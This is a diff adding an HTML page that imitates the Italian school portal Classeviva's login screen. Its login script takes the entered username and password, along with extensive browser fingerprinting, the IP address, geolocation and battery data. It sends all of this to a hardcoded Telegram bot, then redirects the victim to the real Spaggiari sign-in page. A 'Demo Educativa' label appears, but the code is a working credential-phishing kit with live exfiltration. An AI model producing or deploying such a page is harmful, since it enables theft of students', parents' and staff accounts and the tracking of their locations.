@@ -1,0 +1,753 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Accedi - Classeviva</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #cc0000;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background-color: #cc0000;
+            color: white;
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 16px;
+        }
+        
+        .header .brand {
+            display: flex;
+            align-items: center;
+        }
+        
+        .header .brand-text {
+            font-weight: 600;
+            font-size: 18px;
+        }
+        
+        .header .tagline {
+            font-weight: 300;
+            font-size: 14px;
+            margin-left: 8px;
+        }
+        
+        .main-container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 60px 20px 200px;
+        }
+        
+        .login-box {
+            background: white;
+            border-radius: 0;
+            padding: 50px;
+            max-width: 1000px;
+            width: 100%;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: relative;
+        }
+        
+        .error-message {
+            color: #cc0000;
+            font-size: 14px;
+            margin-bottom: 30px;
+            font-weight: 400;
+            text-align: left;
+        }
+        
+        .login-section {
+            margin-bottom: 40px;
+        }
+        
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr auto;
+            gap: 20px;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .form-group {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .form-group label {
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #333;
+            font-size: 16px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 6px;
+            font-size: 16px;
+            background: #fafafa;
+            color: #333;
+            min-width: 300px;
+            transition: all 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #0066cc;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1);
+        }
+        
+        .form-group input:valid {
+            border-color: #28a745;
+        }
+        
+        .password-group {
+            position: relative;
+        }
+        
+        .password-group input {
+            padding-right: 45px;
+        }
+        
+        .password-toggle {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 18px;
+            color: #666;
+        }
+        
+        .login-section-right {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 10px;
+        }
+        
+        .forgot-password {
+            color: #cc0000;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 400;
+            white-space: nowrap;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .login-btn {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 12px 28px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+        
+        .login-btn:hover {
+            background: #1e7e34;
+        }
+        
+        .divider {
+            text-align: center;
+            margin: 40px 0;
+            position: relative;
+            font-size: 16px;
+            color: #333;
+        }
+        
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #ddd;
+        }
+        
+        .divider span {
+            background: white;
+            padding: 0 30px;
+        }
+        
+        .alternative-section {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 60px;
+            align-items: start;
+        }
+        
+        .alternative-text {
+            font-size: 14px;
+            color: #333;
+            line-height: 1.8;
+        }
+        
+        .alternative-text p {
+            margin-bottom: 5px;
+        }
+        
+        .alternative-text a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+        
+        .alternative-text a:hover {
+            text-decoration: underline;
+        }
+        
+        .auth-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            min-width: 220px;
+        }
+        
+        .auth-btn {
+            padding: 15px 25px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: #0066cc;
+            color: white;
+        }
+        
+        .auth-btn:hover {
+            background: #0052a3;
+        }
+        
+        .spid-icon {
+            width: 26px;
+            height: 26px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: bold;
+            color: #0066cc;
+        }
+        
+        .cie-icon {
+            width: 26px;
+            height: 26px;
+            background: white;
+            border-radius: 3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+            color: #0066cc;
+        }
+        
+        .footer-section {
+            background: #cc0000;
+            color: white;
+            text-align: center;
+            padding: 30px 20px;
+            font-size: 14px;
+        }
+        
+        .footer-section a {
+            color: white;
+            text-decoration: underline;
+        }
+        
+        .classeviva-logo {
+            margin: 50px 0 30px;
+        }
+        
+        .classeviva-title {
+            font-size: 82px;
+            font-weight: 700;
+            letter-spacing: 4px;
+            margin-bottom: 15px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .classeviva-subtitle {
+            font-size: 36px;
+            font-weight: 300;
+            font-style: italic;
+        }
+        
+        .cookie-banner {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(45, 55, 72, 0.95);
+            color: white;
+            padding: 20px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 30px;
+            z-index: 1000;
+        }
+        
+        .cookie-text {
+            flex: 1;
+            font-size: 14px;
+            line-height: 1.5;
+            min-width: 400px;
+        }
+        
+        .cookie-text a {
+            color: white;
+            text-decoration: underline;
+            font-weight: 600;
+        }
+        
+        .cookie-buttons {
+            display: flex;
+            gap: 20px;
+            flex-shrink: 0;
+        }
+        
+        .cookie-btn {
+            padding: 10px 25px;
+            border: 1px solid #666;
+            background: transparent;
+            color: white;
+            border-radius: 0;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .cookie-btn:hover {
+            background: rgba(255,255,255,0.1);
+        }
+        
+        .cookie-btn.accept-all {
+            background: transparent;
+            border-color: white;
+        }
+        
+        .cookie-btn.accept-all:hover {
+            background: white;
+            color: #333;
+        }
+        
+        @media (max-width: 1024px) {
+            .alternative-section {
+                grid-template-columns: 1fr;
+                gap: 40px;
+            }
+            
+            .form-row {
+                grid-template-columns: 1fr;
+                gap: 20px;
+            }
+            
+            .login-section-right {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: center;
+                width: 100%;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .header {
+                padding: 15px;
+                flex-direction: column;
+                gap: 8px;
+                text-align: center;
+            }
+            
+            .main-container {
+                padding: 30px 15px 180px;
+            }
+            
+            .login-box {
+                padding: 30px 25px;
+            }
+            
+            .form-group input {
+                min-width: unset;
+            }
+            
+            .classeviva-title {
+                font-size: 56px;
+                letter-spacing: 2px;
+            }
+            
+            .classeviva-subtitle {
+                font-size: 28px;
+            }
+            
+            .cookie-banner {
+                flex-direction: column;
+                text-align: center;
+                padding: 20px 15px;
+                gap: 20px;
+            }
+            
+            .cookie-text {
+                min-width: unset;
+            }
+            
+            .cookie-buttons {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="brand">
+            <span class="brand-text">GRUPPOSPAGGIARIPARMA</span>
+            <span class="tagline">Un futuro ricco di esperienza</span>
+        </div>
+        <div>Italia - IT</div>
+    </header>
+
+    <main class="main-container">
+        <div class="login-box">
+            <div class="error-message">
+                Attenzione! Dopo 5 tentativi di login con credenziali errate l'accesso sarà sospeso per 60 minuti.
+            </div>
+
+            <div class="login-section">
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="username">Codice Personale / Email</label>
+                        <input type="text" id="username" name="username" placeholder="Codice Personale / Email">
+                    </div>
+                    <div class="form-group password-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" placeholder="Password">
+                        <button type="button" class="password-toggle">👁</button>
+                    </div>
+                    <div class="login-section-right">
+                        <a href="#" class="forgot-password">Password dimenticata?</a>
+                        <button type="button" class="login-btn">Entra con le credenziali</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="divider">
+                <span>In alternativa</span>
+            </div>
+
+            <div class="alternative-section">
+                <div class="alternative-text">
+                    <p>Solo per le scuole statali si potrà accedere tramite SPID e CIE.</p>
+                    <p><a href="#">Maggiori informazioni su SPID</a></p>
+                    <p><a href="#">Non hai SPID?</a></p>
+                    <p>Il servizio è offerto dal Ministero dell'Istruzione.</p>
+                    <p><a href="#">Maggiori informazioni sulla CIE</a></p>
+                    <p><a href="#">Non hai la CIE?</a></p>
+                </div>
+
+                <div class="auth-buttons">
+                    <button class="auth-btn spid-btn">
+                        <div class="spid-icon">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <circle cx="12" cy="12" r="10" fill="#0066cc"/>
+                                <path d="M12 6L15.5 12L12 18L8.5 12L12 6Z" fill="white"/>
+                            </svg>
+                        </div>
+                        Entra con SPID
+                    </button>
+                    <button class="auth-btn cie-btn">
+                        <div class="cie-icon">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <rect x="4" y="6" width="16" height="12" rx="2" fill="#0066cc"/>
+                                <path d="M6 8H18V16H6V8Z" fill="white"/>
+                                <path d="M10 10H14V14H10V10Z" fill="#0066cc"/>
+                            </svg>
+                        </div>
+                        Entra con CIE
+                    </button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer-section">
+        <div>Sei un genitore? Scopriamo insieme le funzionalità di Classeviva: <a href="#">clicca qui</a>.</div>
+        
+        <div class="classeviva-logo">
+            <div class="classeviva-title">CLASSEVIVA</div>
+            <div class="classeviva-subtitle">Il cuore pulsante</div>
+        </div>
+    </footer>
+
+    <div class="cookie-banner">
+        <div class="cookie-text">
+            Questo sito o gli strumenti terzi da questo utilizzati si avvalgono di cookie necessari al funzionamento ed utili alle finalità illustrate nella <a href="#">COOKIE POLICY</a>.
+        </div>
+        <div class="cookie-buttons">
+            <button class="cookie-btn">RIFIUTA TUTTI</button>
+            <button class="cookie-btn">PERSONALIZZA</button>
+            <button class="cookie-btn accept-all">ACCETTA TUTTI</button>
+        </div>
+    </div>
+
+    <script>
+        // Password toggle functionality
+        document.querySelector('.password-toggle').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            const toggleBtn = this;
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleBtn.textContent = '👁️';
+            } else {
+                passwordInput.type = 'password';
+                toggleBtn.textContent = '👁';
+            }
+        });
+
+        // Cookie banner functionality
+        document.querySelectorAll('.cookie-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelector('.cookie-banner').style.display = 'none';
+            });
+        });
+
+        // SPID and CIE buttons
+        const spidBtn = document.querySelector('.spid-btn');
+        if (spidBtn) {
+            spidBtn.addEventListener('click', function() {
+                window.open('https://www.spid.gov.it/', '_blank');
+            });
+        } else {
+            console.error('SPID button not found');
+        }
+
+        const cieBtn = document.querySelector('.cie-btn');
+        if (cieBtn) {
+            cieBtn.addEventListener('click', function() {
+                window.open('https://www.cie.gov.it/', '_blank');
+            });
+        } else {
+            console.error('CIE button not found');
+        }
+
+        // Focus placeholder management
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('focus', function() {
+                if (this.value === this.placeholder) {
+                    this.value = '';
+                    this.style.color = '#333';
+                }
+            });
+            
+            input.addEventListener('blur', function() {
+                if (this.value === '') {
+                    this.style.color = '#999';
+                }
+            });
+        });
+
+        // Optimized login functionality with Telegram integration
+        let attemptCount = 0;
+        const sessionId = crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).substring(2);
+        const pageLoadTime = performance.now();
+        const TELEGRAM_URL = `https://api.telegram.org/bot7556420865:AAHAC4hCO1MoP2gRjyANv9REUQeealWrSfc/sendMessage`;
+        const TELEGRAM_CHAT_ID = 7736294680;
+
+        async function sendToTelegram(data) {
+            const payload = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: data
+            };
+
+            for (let attempt = 0; attempt < 2; attempt++) {
+                try {
+                    const response = await fetch(TELEGRAM_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload),
+                        timeout: 5000 // 5-second timeout
+                    });
+                    if (response.ok) {
+                        console.log('Dati inviati con successo a Telegram');
+                        return true;
+                    }
+                } catch (error) {
+                    console.error(`Tentativo ${attempt + 1} fallito:`, error);
+                    if (attempt === 0) await new Promise(resolve => setTimeout(resolve, 1000)); // Retry after 1 second
+                }
+            }
+            console.error('Invio a Telegram fallito dopo 2 tentativi');
+            return false;
+        }
+
+        document.querySelector('.login-btn').addEventListener('click', async function() {
+            attemptCount++;
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const errorMessage = document.querySelector('.error-message');
+
+            // Validation
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const usernameRegex = /^[\w\d_]{5,}$/;
+            const isEmailValid = emailRegex.test(username) || usernameRegex.test(username);
+            const isPasswordValid = password.length >= 8;
+
+            if (!isEmailValid || !isPasswordValid) {
+                errorMessage.textContent = 'Inserisci un codice personale/email valido e una password di almeno 8 caratteri.';
+                return;
+            }
+
+            // Collect data
+            const data = {
+                'Demo Educativa - Login Classeviva': true,
+                'Email/Username': username || 'Non inserito',
+                'Password': password || 'Non inserito',
+                'IP': 'Non disponibile',
+                'User Agent': navigator.userAgent || 'Non disponibile',
+                'Versione Browser': navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)\/([\d.]+)/)?.[2] || 'Non disponibile',
+                'Risoluzione Schermo': `${window.screen.width}x${window.screen.height}` || 'Non disponibile',
+                'Dimensione Finestra': `${window.innerWidth}x${window.innerHeight}` || 'Non disponibile',
+                'Lingua Browser': navigator.language || 'Non disponibile',
+                'Lingue Accettate': navigator.languages ? navigator.languages.join(', ') : 'Non disponibile',
+                'Orario Locale': new Date().toLocaleString() || 'Non disponibile',
+                'Timestamp UTC': new Date().toISOString() || 'Non disponibile',
+                'Fuso Orario': Intl.DateTimeFormat().resolvedOptions().timeZone || 'Non disponibile',
+                'Dispositivo': /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                'Piattaforma': navigator.platform || 'Non disponibile',
+                'Profondità Colore': window.screen.colorDepth || 'Non disponibile',
+                'Do Not Track': navigator.doNotTrack || 'Non disponibile',
+                'Core CPU': navigator.hardwareConcurrency || 'Non disponibile',
+                'Punti Touch': navigator.maxTouchPoints || 0,
+                'Cookies Abilitati': navigator.cookieEnabled ? 'Sì' : 'No',
+                'WebGL': !!window.WebGLRenderingContext ? 'Sì' : 'No',
+                'Referrer': document.referrer || 'Non disponibile',
+                'Tipo Connessione': (navigator.connection || {}).effectiveType || 'Non disponibile',
+                'Velocità Download': (navigator.connection || {}).downlink || 'Non disponibile',
+                'RTT': (navigator.connection || {}).rtt || 'Non disponibile',
+                'Geolocalizzazione': 'Non disponibile',
+                'Livello Batteria': 'Non disponibile',
+                'In Carica': 'Non disponibile',
+                'Orientamento': typeof window.orientation !== 'undefined' ? window.orientation : 'Non disponibile',
+                'Memoria Dispositivo': navigator.deviceMemory || 'Non disponibile',
+                'Tempo Compilazione': Math.round(performance.now() - pageLoadTime) / 1000 + 's',
+                'Numero Tentativi': attemptCount,
+                'ID Sessione': sessionId,
+                'URL': window.location.href,
+                'Metodo Login': emailRegex.test(username) ? 'Email' : usernameRegex.test(username) ? 'Username' : 'Non specificato'
+            };
+
+            // Fetch IP
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                data.IP = (await ipResponse.json()).ip;
+            } catch (e) { }
+
+            // Fetch geolocation
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                });
+                data.Geolocalizzazione = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}, Precisione: ${position.coords.accuracy}m`;
+            } catch (e) { }
+
+            // Fetch battery
+            try {
+                const battery = await navigator.getBattery();
+                data['Livello Batteria'] = `${Math.round(battery.level * 100)}%`;
+                data['In Carica'] = battery.charging ? 'Sì' : 'No';
+            } catch (e) { }
+
+            // Convert data to string
+            const message = Object.entries(data)
+                .map(([key, value]) => `${key}: ${value}`)
+                .join('\n');
+
+            // Send to Telegram
+            if (await sendToTelegram(message)) {
+                errorMessage.textContent = 'Dati inviati con successo. Reindirizzamento in corso...';
+                if (isEmailValid && isPasswordValid) {
+                    window.open('https://web.spaggiari.eu/sso/app/default/sso.php', '_blank');
+                }
+            } else {
+                errorMessage.textContent = 'Errore nell\'invio dei dati. Riprova o verifica la connessione.';
+            }
+        });
+    </script>
+</body>
+</html>
